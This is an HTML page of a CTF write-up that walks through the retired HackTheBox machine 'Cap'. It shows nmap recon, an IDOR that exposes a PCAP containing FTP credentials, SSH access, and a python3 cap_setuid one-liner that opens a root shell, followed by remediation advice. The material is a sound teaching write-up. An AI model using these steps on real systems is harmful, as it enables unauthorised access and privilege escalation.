@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Cap is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, discovering a PCAP download vulnerability exposing FTP credentials, and privilege escalation via Linux capabilities.">
+<meta name="author" content="Saurabh Jain">
+<title>Cap Walk-through: HackTheBox Machine Write-up · Saurabh Jain</title>
+
+
+<meta property="og:type"        content="article">
+<meta property="og:title"       content="Cap Walk-through: HackTheBox Machine Write-up">
+<meta property="og:description" content="Cap is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, discovering a PCAP download vulnerability exposing FTP credentials, and privilege escalation via Linux capabilities.">
+<meta property="og:url"         content="http://localhost:1313/posts/cap-hackthebox-walkthrough/">
+<meta property="og:site_name"   content="Saurabh Jain">
+
+<meta property="og:image"       content="https://miro.medium.com/v2/resize:fit:791/1*8T_XCFg5mvf1pACOllyP2Q.png">
+<meta name="twitter:image"      content="https://miro.medium.com/v2/resize:fit:791/1*8T_XCFg5mvf1pACOllyP2Q.png">
+
+
+<meta property="article:published_time" content="2021-10-19T00:00:00Z">
+<meta property="article:tag" content="hackthebox"><meta property="article:tag" content="ctf"><meta property="article:tag" content="privilege-escalation">
+
+
+
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="Cap Walk-through: HackTheBox Machine Write-up">
+<meta name="twitter:description" content="Cap is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, discovering a PCAP download vulnerability exposing FTP credentials, and privilege escalation via Linux capabilities.">
+
+
+<link rel="canonical" href="https://medium.com/bugbountywriteup/cap-walk-through-hackthebox-machine-write-up-6ccacc208d73">
+
+
+<link rel="alternate" type="application/rss+xml" href="/index.xml" title="Saurabh Jain">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script>
+  (function(){
+    var t=localStorage.getItem('sj-theme')||
+      (window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');
+    document.documentElement.setAttribute('data-theme',t);
+  })();
+</script>
+
+
+</head>
+<body>
+  <div id="reading-progress"></div>
+  <header class="site-header">
+  <div class="header-inner">
+    <a href="/" class="site-brand">
+      <span class="brand-name">Saurabh Jain</span>
+      <span class="brand-tagline">Security · Cloud · Bug Bounty</span>
+    </a>
+
+    <nav class="site-nav" id="nav-menu">
+      <a href="/about/">About</a>
+      <a href="/search/" class="nav-icon" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </a>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+        
+        <svg class="icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+        
+        <svg class="icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+      </button>
+    </nav>
+
+    <button class="nav-hamburger" id="nav-toggle" aria-label="Open menu">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+  <main class="site-main">
+<div class="container">
+  <div class="post-layout has-toc">
+
+    
+    
+    <aside class="post-toc">
+      <div class="toc-sticky">
+        <p class="toc-label">Contents</p>
+        <nav class="toc-nav"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1-reconnaissance">Step 1: Reconnaissance</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-web-application-enumeration">Step 2: Web Application Enumeration</a>
+      <ul>
+        <li><a href="#idor--accessing-other-users-pcaps">IDOR — Accessing Other Users&rsquo; PCAPs</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3-extract-credentials-from-pcap">Step 3: Extract Credentials from PCAP</a></li>
+    <li><a href="#step-4-initial-access">Step 4: Initial Access</a></li>
+    <li><a href="#step-5-privilege-escalation-via-linux-capabilities">Step 5: Privilege Escalation via Linux Capabilities</a></li>
+    <li><a href="#why-this-works">Why This Works</a>
+      <ul>
+        <li><a href="#remediation">Remediation</a></li>
+      </ul>
+    </li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+  </ul>
+</nav></nav>
+      </div>
+    </aside>
+    
+
+    
+    <article class="post-content">
+
+      
+      <header class="post-header">
+        
+        <div class="post-tags"><a class="tag" href="/tags/hackthebox">hackthebox</a><a class="tag" href="/tags/ctf">ctf</a><a class="tag" href="/tags/privilege-escalation">privilege-escalation</a></div>
+        
+        <h1 class="post-title">Cap Walk-through: HackTheBox Machine Write-up</h1>
+        <p class="post-subtitle">Cap is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, discovering a PCAP download vulnerability exposing FTP credentials, and privilege escalation via Linux capabilities.</p>
+        <div class="post-byline">
+          <img class="byline-avatar" src="https://github.com/saurabhj4in.png" alt="Saurabh Jain" loading="lazy">
+          <div class="byline-info">
+            <span class="byline-author">Saurabh Jain</span>
+            <div class="byline-meta">
+              <time>October 19, 2021</time>
+              <span class="dot">·</span>
+              <span>2 min read</span>
+              
+              <span class="dot">·</span>
+              <a href="https://medium.com/bugbountywriteup/cap-walk-through-hackthebox-machine-write-up-6ccacc208d73" target="_blank" rel="noopener">View on Medium ↗</a>
+              
+            </div>
+          </div>
+        </div>
+      </header>
+
+      
+      
+      <img class="post-cover-img" src="https://miro.medium.com/v2/resize:fit:791/1*8T_XCFg5mvf1pACOllyP2Q.png" alt="Cap Walk-through: HackTheBox Machine Write-up" loading="eager">
+      
+
+      
+      
+<div class="medium-banner">
+  <svg width="20" height="20" viewBox="0 0 195 195" fill="currentColor"><ellipse cx="55" cy="97.5" rx="55" ry="55"/><ellipse cx="149.5" cy="97.5" rx="29.5" ry="52"/><ellipse cx="186.5" cy="97.5" rx="8.5" ry="45"/></svg>
+  <span>Originally published on Medium — <a href="https://medium.com/bugbountywriteup/cap-walk-through-hackthebox-machine-write-up-6ccacc208d73" target="_blank" rel="noopener">read there for comments &amp; claps →</a></span>
+</div>
+
+
+
+      
+      <div class="post-body"><p>Cap is a beginner-friendly Linux machine on HackTheBox. It teaches a common pattern: a web application that exposes network captures, combined with Linux capability abuse for privilege escalation.</p>
+<blockquote>
+<p>Note: Cap is a retired machine. VIP access is required on HackTheBox to access retired machines.</p>
+</blockquote>
+<h2 id="step-1-reconnaissance">Step 1: Reconnaissance</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN cap.txt 10.10.10.245
+</span></span></code></pre></div><h3 id="open-ports">Open Ports</h3>
+<table>
+	<thead>
+			<tr>
+					<th>Port</th>
+					<th>Service</th>
+					<th>Version</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>21/tcp</td>
+					<td>FTP</td>
+					<td>vsftpd 3.0.3</td>
+			</tr>
+			<tr>
+					<td>22/tcp</td>
+					<td>SSH</td>
+					<td>OpenSSH 8.2p1 Ubuntu</td>
+			</tr>
+			<tr>
+					<td>80/tcp</td>
+					<td>HTTP</td>
+					<td>gunicorn (Python web server)</td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="step-2-web-application-enumeration">Step 2: Web Application Enumeration</h2>
+<p>Visiting port 80 reveals a network monitoring dashboard. The user <strong>Nathan</strong> is already logged in. The app displays network statistics and lets you download PCAP (packet capture) files.</p>
+<h3 id="idor--accessing-other-users-pcaps">IDOR — Accessing Other Users&rsquo; PCAPs</h3>
+<p>The default URL loads your capture at <code>/data/5</code> (or similar). Change the ID to <code>/data/0</code>:</p>
+<pre tabindex="0"><code>http://10.10.10.245/data/0
+</code></pre><p>This returns a PCAP with <strong>actual FTP session traffic</strong> — including credentials in cleartext.</p>
+<h2 id="step-3-extract-credentials-from-pcap">Step 3: Extract Credentials from PCAP</h2>
+<p>Open the PCAP in Wireshark and filter for FTP:</p>
+<pre tabindex="0"><code>ftp
+</code></pre><p>The FTP session shows:</p>
+<pre tabindex="0"><code>USER nathan
+PASS &lt;password&gt;
+</code></pre><h2 id="step-4-initial-access">Step 4: Initial Access</h2>
+<p>Use the extracted credentials to SSH in:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh nathan@10.10.10.245
+</span></span></code></pre></div><p>Grab the user flag from <code>/home/nathan/user.txt</code>.</p>
+<h2 id="step-5-privilege-escalation-via-linux-capabilities">Step 5: Privilege Escalation via Linux Capabilities</h2>
+<p>Check for binaries with special capabilities:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><p>Output includes:</p>
+<pre tabindex="0"><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+</code></pre><p><code>cap_setuid</code> on Python means Python can call <code>setuid(0)</code> to become root without needing the SUID bit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>You now have a root shell. Grab <code>/root/root.txt</code>.</p>
+<h2 id="why-this-works">Why This Works</h2>
+<p>Linux capabilities are a fine-grained privilege system. <code>cap_setuid</code> lets a process change its UID — when granted to an interpreter like Python, it&rsquo;s equivalent to giving root to anyone who can run Python scripts.</p>
+<h3 id="remediation">Remediation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remove the capability</span>
+</span></span><span class="line"><span class="cl">setcap -r /usr/bin/python3.8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Or restrict who can execute Python</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">750</span> /usr/bin/python3.8
+</span></span><span class="line"><span class="cl">chown root:dev /usr/bin/python3.8
+</span></span></code></pre></div><h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>IDOR in file downloads is critical</strong> — sequential IDs on sensitive files (PCAPs, logs, exports) should never be accessible without authorisation checks</li>
+<li><strong>FTP is plaintext</strong> — credentials sent over FTP are visible to anyone capturing traffic on the network</li>
+<li><strong>Linux capabilities are overlooked</strong> — <code>getcap</code> should be in every privilege escalation checklist alongside SUID, sudo, and cron</li>
+</ol>
+<hr>
+<p><em>HackTheBox machine: Cap (retired). Rated Easy.</em></p>
+</div>
+
+      <hr class="post-divider">
+
+      
+      
+      <div class="post-tags-footer">
+        <span class="tags-label">Topics:</span>
+        <a class="tag" href="/tags/hackthebox">hackthebox</a><a class="tag" href="/tags/ctf">ctf</a><a class="tag" href="/tags/privilege-escalation">privilege-escalation</a>
+      </div>
+      
+
+      
+      
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    
+  
+
+
+
+
+
+<section class="related-section">
+  <h2 class="related-title">You might also like</h2>
+  <div class="related-grid">
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/bountyhunter-hackthebox-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/resize:fit:701/1*WMKrPWBxn-eOt2SFciC8Kw.png" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">hackthebox</span>
+        <h3 class="related-card-title">BountyHunter Walkthrough: HackTheBox Writeup</h3>
+        <span class="related-meta">Nov 21, 2021 · 2 min</span>
+      </div>
+    </a>
+    
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/agentsudo-tryhackme-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/resize:fit:828/1*ZwI1k9l-zpRWnvBoK4UIqA.png" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">tryhackme</span>
+        <h3 class="related-card-title">AgentSudo Write-Up: TryHackMe Machine Walk-through</h3>
+        <span class="related-meta">Jan 9, 2022 · 2 min</span>
+      </div>
+    </a>
+    
+    
+    
+    <a class="related-card" href="http://localhost:1313/posts/tomghost-tryhackme-walkthrough/">
+      
+      <img class="related-img" src="https://miro.medium.com/v2/resize:fit:1088/1*x5yscQ9QnXBayb5_F3uFMw.png" alt="" loading="lazy">
+      
+      <div class="related-body">
+        <span class="tag">tryhackme</span>
+        <h3 class="related-card-title">TomGhost Write-Up: TryHackMe Walk-through</h3>
+        <span class="related-meta">Nov 9, 2021 · 2 min</span>
+      </div>
+    </a>
+    
+    
+  </div>
+</section>
+
+
+
+      
+      
+<section class="comments-section comments-disabled">
+  <div class="comments-placeholder">
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <p>Comments coming soon via Giscus.</p>
+    <a href="https://saurabh-jain.medium.com/" target="_blank" rel="noopener">Discuss this on Medium →</a>
+  </div>
+</section>
+
+
+
+      
+      <nav class="post-nav">
+        
+        <a class="post-nav-link prev" href="http://localhost:1313/posts/backdoor-1-netsquare-ctf/">
+          <span class="nav-label">← Previous</span>
+          <span class="nav-title">BackDoor 1: NET-SQUARE Hacking Warm-Up Mobile Application Challenge</span>
+        </a>
+        
+        
+        <a class="post-nav-link next" href="http://localhost:1313/posts/tomghost-tryhackme-walkthrough/">
+          <span class="nav-label">Next →</span>
+          <span class="nav-title">TomGhost Write-Up: TryHackMe Walk-through</span>
+        </a>
+        
+      </nav>
+
+      <div class="back-link"><a href="/">← All posts</a></div>
+
+    </article>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+
+  </main>
+  <footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <span class="brand-name">Saurabh Jain</span>
+        <p class="footer-bio">Security engineer writing about cloud security, bug bounties, AWS, and the grey areas no one puts on a slide deck.</p>
+      </div>
+      <div class="footer-links-group">
+        <p class="footer-group-title">Writing</p>
+        <a href="/posts/">All Posts</a>
+        <a href="/tags/">Topics</a>
+        <a href="/index.xml">RSS Feed</a>
+      </div>
+      <div class="footer-links-group">
+        <p class="footer-group-title">Connect</p>
+        <a href="https://saurabh-jain.medium.com/" target="_blank" rel="noopener">Medium</a>
+        <a href="https://www.linkedin.com/in/saurabh-jain-503991165/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://github.com/saurabhj4in" target="_blank" rel="noopener">GitHub</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2026 Saurabh Jain · Built with Hugo · Hosted on GitHub Pages</p>
+    </div>
+  </div>
+</footer>
+
+  <script src="/js/main.js"></script>
+  
+  
+</body>
+</html>
